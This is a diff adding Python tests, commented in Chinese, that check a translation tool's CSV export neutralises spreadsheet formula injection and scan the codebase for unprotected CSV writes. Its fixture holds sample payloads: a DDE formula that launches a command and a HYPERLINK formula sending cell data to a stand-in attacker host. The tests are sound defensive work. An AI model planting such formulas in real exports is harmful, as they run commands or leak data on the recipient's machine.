@@ -258,3 +258,103 @@ def test_all_xlsx_writers_go_through_the_helper():
     assert not bad, (
         "這些地方直接寫入 xlsx 儲存格，請改用 csv_safe.xlsx_cell：\n  "
         + "\n  ".join(bad))
+
+
+# ---------------------------------------------------------------------------
+# 逐句翻譯的 CSV —— v1.14.31 對抗式驗證抓到的漏網之魚
+# ---------------------------------------------------------------------------
+
+def test_translate_doc_csv_neutralises_formulas():
+    """逐句翻譯的 CSV 匯出也要中和公式。
+
+    `source` 欄的內容來自使用者上傳的文件 —— 也就是**別人寄來的** PDF / Word，
+    內容完全不受控。同一支檔案的 xlsx 匯出早就走 `csv_safe` 了，只有 CSV
+    這條漏掉，實測走真正的 HTTP 端點可以打出兩列會被 Excel 當公式執行的內容。
+    """
+    from app.tools.translate_doc.router import _build_csv
+
+    pairs = [
+        {"source": "=cmd|'/c calc.exe'!A1",
+         "target": '=HYPERLINK("http://evil.example/?d="&A1,"點我看報價")'},
+        {"source": "+1+1", "target": "@SUM(1)"},
+        {"source": "-5", "target": "正常句子"},
+    ]
+    text = _build_csv(pairs).decode("utf-8-sig")
+    for line in text.splitlines()[1:]:
+        if not line:
+            continue
+        # 去掉 CSV 的外層引號之後，第一個字元不可以是公式起始符號
+        first = line.lstrip('"')[:1]
+        assert first not in "=+-@", f"這一列會被 Excel 當公式執行：{line}"
+
+
+def test_translate_doc_csv_keeps_normal_text_intact():
+    """中和不可以把正常內容改壞。"""
+    from app.tools.translate_doc.router import _build_csv
+
+    text = _build_csv([{"source": "Hello world", "target": "你好，世界"}])
+    body = text.decode("utf-8-sig")
+    assert "Hello world" in body and "你好，世界" in body
+
+
+# ---------------------------------------------------------------------------
+# 全站掃描：任何寫進 CSV 的「資料」都要中和過
+# ---------------------------------------------------------------------------
+
+#: 允許不走 `csv_safe` 的例外，**每一條都要寫清楚為什麼安全**。
+#: 沒有理由就不該在這裡。
+_ALLOWED = {
+    # 全部是整數統計欄位，不可能以 = + - @ 開頭
+    "app/tools/pdf_wordcount/router.py",
+}
+
+
+def test_every_csv_data_row_is_neutralised():
+    """逐一檢查 `writerow` / `writerows` 的資料列有沒有走 `csv_safe`。
+
+    ## 為什麼要用掃描而不是逐支測
+
+    這個專案修過一次公式注入，然後**又長回來**：逐句翻譯的 CSV 沒走
+    `csv_safe`（而同一支檔案的 xlsx 走了），電子發票與乘車證明的**欄位標題**
+    也沒走 —— 而那個標題是每位使用者自己可以設定的，塞公式進去、匯出 CSV
+    寄給會計，就在對方的 Excel 裡執行。
+
+    逐支寫測試永遠追不上新工具，掃描才追得上。
+
+    標題列（整個是字串常數的 list）不算資料，跳過。
+    """
+    import ast
+    import pathlib
+
+    root = pathlib.Path(__file__).resolve().parent.parent
+    bad = []
+    for f in sorted((root / "app").rglob("*.py")):
+        rel = str(f.relative_to(root))
+        if rel in _ALLOWED:
+            continue
+        try:
+            tree = ast.parse(f.read_text(encoding="utf-8"))
+        except SyntaxError:
+            continue
+        for node in ast.walk(tree):
+            if not isinstance(node, ast.Call):
+                continue
+            fn = node.func
+            if not (isinstance(fn, ast.Attribute)
+                    and fn.attr in ("writerow", "writerows")):
+                continue
+            arg = node.args[0] if node.args else None
+            # 標題列：整個是字串常數
+            if isinstance(arg, (ast.List, ast.Tuple)) and arg.elts and all(
+                    isinstance(e, ast.Constant) and isinstance(e.value, str)
+                    for e in arg.elts):
+                continue
+            src = ast.unparse(node)
+            if "csv_safe" in src:
+                continue
+            bad.append(f"{rel}:{node.lineno}  {src[:80]}")
+
+    assert not bad, (
+        "這些 CSV 寫入沒有中和公式（`=` `+` `-` `@` 開頭的儲存格會被 Excel "
+        "當程式執行）：\n" + "\n".join(bad)
+        + "\n改用 `csv_safe.row(...)`；確定安全的話寫進本檔的 `_ALLOWED` 並附理由。")
